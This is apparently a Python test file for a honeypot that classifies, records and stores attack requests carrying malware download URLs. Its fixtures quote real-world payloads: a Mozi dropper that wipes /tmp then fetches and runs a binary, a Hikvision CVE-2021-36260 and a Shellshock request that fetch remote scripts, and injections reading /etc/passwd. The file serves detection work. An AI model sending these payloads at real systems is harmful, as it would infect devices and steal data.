"""Download URLs from capture to storage: how the web decoy classifies a request that carries
one, what it records, and what the store keeps. Every request shape here was seen on the live
site or is a close copy of one."""
import asyncio
import json
import os
import tempfile
import unittest

from uninvited import droppers, intel
from uninvited.core import Knock
from uninvited.listeners import HttpListener
from uninvited.personas import HttpRequest
from uninvited.store import MAX_SOURCES, Store

MOZI = "/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://175.107.3.233:43777/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron"


def req(method, path, headers=None, body=b"", target=None):
    return HttpRequest(target=target or f"{method} {path} HTTP/1.1", method=method, path=path,
                       headers=headers or {}, body=body, raw=b"")


class ClassificationTests(unittest.TestCase):
    def classify(self, method, path, headers=None, body=b"", target=None):
        return HttpListener.classify(None, req(method, path, headers, body, target))

    def test_the_mozi_request_is_a_malware_dropper(self):
        self.assertEqual(self.classify("GET", MOZI), ("Malware Dropper Command", "malware delivery"))

    def test_a_specific_exploit_keeps_its_name_and_still_yields_the_url(self):
        body = b"<language>$(wget http://45.9.148.5/x.sh -O- | sh)</language>"
        name, _ = self.classify("PUT", "/SDK/webLanguage", body=body)
        self.assertEqual(name, "Hikvision RCE (CVE-2021-36260)")
        self.assertEqual([d.url for d in droppers.extract(droppers.decode("/SDK/webLanguage", {}, body))],
                         ["http://45.9.148.5/x.sh"])

    def test_a_command_with_no_url_is_a_shell_injection(self):
        self.assertEqual(self.classify("GET", "/x?c=;cat+/etc/passwd")[0], "Shell Command Injection")
        self.assertEqual(self.classify("GET", "/x?c=`uname -a`")[0], "Shell Command Injection")
        self.assertEqual(self.classify("POST", "/x", body=b"cmd=wget http://10.0.0.1/x")[0], "Shell Command Injection")
        self.assertEqual(self.classify("GET", "/cgi-bin/x?a=|/bin/sh -c id")[0], "Shell Command Injection")

    def test_ordinary_requests_that_look_a_little_like_commands_are_left_alone(self):
        for path in ("/index.php?a=1;id=2", "/search?q=how+to+use+wget", "/blog/curl-tutorial.html", "/x?sh=1",
                     "/api?cmd=ls", "/docs/bash-guide", "/a;b", "/shop?item=nc-45", "/download/wget-1.21.tar.gz"):
            self.assertEqual(self.classify("GET", path)[0], "Unclassified Probe", path)

    def test_probes_seen_on_the_live_site(self):
        for path, name in (("/ignite?cmd=version", "Apache Ignite Probe"), ("/geoserver/web/", "GeoServer Probe"),
                           ("/pom.xml", "Dependency File Hunt"), ("/package-lock.json", "Dependency File Hunt"),
                           ("/requirements.txt", "Dependency File Hunt"), ("/Gemfile.lock", "Dependency File Hunt"),
                           ("/composer.lock", "Dependency File Hunt"), ("/build.gradle", "Dependency File Hunt"),
                           ("/metrics", "Metrics Endpoint Probe"), ("/debug/pprof/", "Metrics Endpoint Probe")):
            self.assertEqual(self.classify("GET", path)[0], name, path)

    def test_the_root_path_is_a_root_fingerprint_again(self):
        # The rule matched only a bare "/" and stopped firing once headers joined the match text.
        ua = {"user-agent": "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"}
        self.assertEqual(self.classify("GET", "/", ua)[0], "Root Fingerprint")
        self.assertEqual(self.classify("GET", "//", ua)[0], "Root Fingerprint")
        self.assertEqual(self.classify("GET", "/?a=1", ua)[0], "Unclassified Probe")
        self.assertEqual(self.classify("{", "/", target="{ w /")[0], "Malformed Request")

    def test_tls_and_socks_sent_to_a_web_port(self):
        self.assertEqual(self.classify("\x16\x03\x01\x00\xc8\x01", "/", target="\x16\x03\x01\x00\xc8\x01\x00\x00")[0],
                         "TLS Handshake on Plain HTTP")
        self.assertEqual(self.classify("\x05\x01\x00", "/", target="\x05\x01\x00")[0], "SOCKS Proxy Probe")
        self.assertEqual(self.classify("\x04\x01\x00P", "/", target="\x04\x01\x00P\x01\x01\x01\x01")[0], "SOCKS Proxy Probe")
        for name in ("TLS Handshake on Plain HTTP", "SOCKS Proxy Probe", "Root Fingerprint"):
            self.assertIn(name, intel.GENERIC_EXPLOITS)          # looking is not exploiting

    def test_a_dropper_is_an_exploit_for_scoring_and_the_probes_are_not(self):
        for name in ("Malware Dropper Command", "Shell Command Injection", "Apache Ignite Probe", "GeoServer Probe",
                     "Dependency File Hunt", "Metrics Endpoint Probe"):
            self.assertNotIn(name, intel.GENERIC_EXPLOITS, name)

    def test_tags_and_techniques(self):
        techniques, cves = intel.tags({"HTTP": 3}, {"Malware Dropper Command": 3})
        self.assertEqual((techniques, cves), (["T1105", "T1190"], []))
        tags = intel.behaviour_tags({"HTTP": 3}, {"Malware Dropper Command": 3}, [], 0)
        self.assertIn("malware-delivery", tags)
        self.assertIn("web-exploit", tags)
        self.assertIn("proxy-scan", intel.behaviour_tags({"HTTP": 3}, {"SOCKS Proxy Probe": 3}, [], 0))
        self.assertEqual(intel.tags({"HTTP": 3}, {"Shell Command Injection": 3})[0], ["T1190"])
        self.assertIn("T1105", intel.TECHNIQUES)
        self.assertIn("malware-delivery", intel.TAG_DESCRIPTIONS)


class ListenerTests(unittest.IsolatedAsyncioTestCase):
    async def send(self, raw: bytes):
        knocks = []

        async def emit(k):
            knocks.append(k)

        listener = HttpListener({"port": 0}, emit, asyncio.Semaphore(10))
        listener.server = await asyncio.start_server(listener._wrap, "127.0.0.1", 0)
        port = listener.server.sockets[0].getsockname()[1]
        try:
            r, w = await asyncio.open_connection("127.0.0.1", port)
            w.write(raw)
            await w.drain()
            await asyncio.wait_for(r.read(4096), 2)
            w.close()
            await asyncio.sleep(0.05)
        finally:
            listener.server.close()
        return knocks

    async def test_the_request_is_recorded_with_its_url(self):
        knocks = await self.send(f"GET {MOZI} HTTP/1.1\r\nHost: x\r\nUser-Agent: Hello\r\n\r\n".encode())
        k = next(k for k in knocks if not k.detail.get("scan"))
        self.assertEqual(k.detail["exploit"], "Malware Dropper Command")
        self.assertEqual(k.detail["purpose"], "malware delivery")
        self.assertEqual(k.detail["droppers"], ["http://175.107.3.233:43777/Mozi.a"])
        self.assertIn(("dropper", "175.107.3.233:43777/Mozi.a"), k.lines)
        self.assertEqual([d.family for d in k.droppers], ["Mozi"])
        self.assertTrue(k.raw)                                   # the raw request is still kept for the owner

    async def test_a_plain_request_has_no_droppers(self):
        knocks = await self.send(b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: curl/8\r\n\r\n")
        k = next(k for k in knocks if not k.detail.get("scan"))
        self.assertNotIn("droppers", k.detail)
        self.assertEqual(k.droppers, [])
        self.assertEqual(k.detail["exploit"], "Root Fingerprint")

    async def test_a_command_in_the_body_and_in_a_header(self):
        body = b"cmd=wget http://45.9.148.5/b.sh"
        knocks = await self.send(b"POST /x HTTP/1.1\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
        self.assertEqual(knocks[0].detail["droppers"], ["http://45.9.148.5/b.sh"])
        knocks = await self.send(b"GET / HTTP/1.1\r\nUser-Agent: () { :; }; /bin/busybox wget http://45.9.148.6/c\r\n\r\n")
        k = next(k for k in knocks if not k.detail.get("scan"))
        self.assertEqual(k.detail["droppers"], ["http://45.9.148.6/c"])
        self.assertEqual(k.detail["exploit"], "Shellshock (CVE-2014-6271)")


class StoreTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.store = Store(os.path.join(self.dir, "t.db"))

    def tearDown(self):
        self.store.close()

    def knock(self, ip, url="http://175.107.3.233:43777/Mozi.a", ts=1000, exploit="Malware Dropper Command"):
        k = Knock(proto="HTTP", ip=ip, port=80, ts=ts)
        k.detail = {"exploit": exploit}
        k.droppers = droppers.extract(f"wget {url}")
        return k

    def row(self, url="http://175.107.3.233:43777/Mozi.a"):
        return self.store.db.execute("SELECT * FROM droppers WHERE url = ?", (url,)).fetchone()

    def test_first_delivery_creates_a_row(self):
        self.store.record(self.knock("198.51.100.7"))
        r = self.row()
        self.assertEqual((r["host"], r["port"], r["scheme"], r["file"], r["family"], r["hits"]),
                         ("175.107.3.233", 43777, "http", "Mozi.a", "Mozi", 1))
        self.assertEqual(json.loads(r["sources"]), ["198.51.100.7"])
        self.assertEqual(r["self_hosted"], 0)
        self.assertEqual(json.loads(r["exploits"]), ["Malware Dropper Command"])

    def test_repeats_count_and_distinct_sources_are_remembered(self):
        for ts, ip in ((1000, "198.51.100.7"), (1500, "198.51.100.7"), (2000, "198.51.100.8")):
            self.store.record(self.knock(ip, ts=ts))
        r = self.row()
        self.assertEqual((r["hits"], r["first_ts"], r["last_ts"]), (3, 1000, 2000))
        self.assertEqual(json.loads(r["sources"]), ["198.51.100.7", "198.51.100.8"])

    def test_a_host_that_delivers_its_own_url_is_marked(self):
        self.store.record(self.knock("175.107.3.233"))
        self.assertEqual(self.row()["self_hosted"], 1)
        # and the mark stays once set
        self.store.record(self.knock("198.51.100.9", ts=1500))
        self.assertEqual(self.row()["self_hosted"], 1)

    def test_the_list_of_sources_and_exploits_is_capped(self):
        for i in range(MAX_SOURCES + 30):
            self.store.record(self.knock(f"198.51.{i // 250}.{i % 250 + 1}", ts=1000 + i,
                                         exploit=f"Exploit {i}"))
        r = self.row()
        self.assertEqual(len(json.loads(r["sources"])), MAX_SOURCES)
        self.assertEqual(len(json.loads(r["exploits"])), 5)
        self.assertEqual(r["hits"], MAX_SOURCES + 30)

    def test_the_table_is_capped(self):
        import uninvited.store as st
        original = st.MAX_DROPPERS
        st.MAX_DROPPERS = 3
        try:
            for i in range(6):
                self.store.record(self.knock("198.51.100.7", url=f"http://45.9.148.{i + 1}/x"))
            self.assertEqual(self.store.db.execute("SELECT COUNT(*) FROM droppers").fetchone()[0], 3)
            # a URL already held still counts
            self.store.record(self.knock("198.51.100.8", url="http://45.9.148.1/x"))
            self.assertEqual(self.store.db.execute("SELECT hits FROM droppers WHERE url = 'http://45.9.148.1/x'").fetchone()[0], 2)
        finally:
            st.MAX_DROPPERS = original

    def test_old_rows_are_pruned_with_the_rest(self):
        self.store.record(self.knock("198.51.100.7", ts=1000))
        self.assertIsNotNone(self.row())
        self.store.prune(1)
        self.assertIsNone(self.row())

    def test_a_knock_with_no_url_touches_nothing(self):
        k = Knock(proto="SSH", ip="198.51.100.7", port=22)
        self.store.record(k)
        self.assertEqual(self.store.db.execute("SELECT COUNT(*) FROM droppers").fetchone()[0], 0)


if __name__ == "__main__":
    unittest.main()
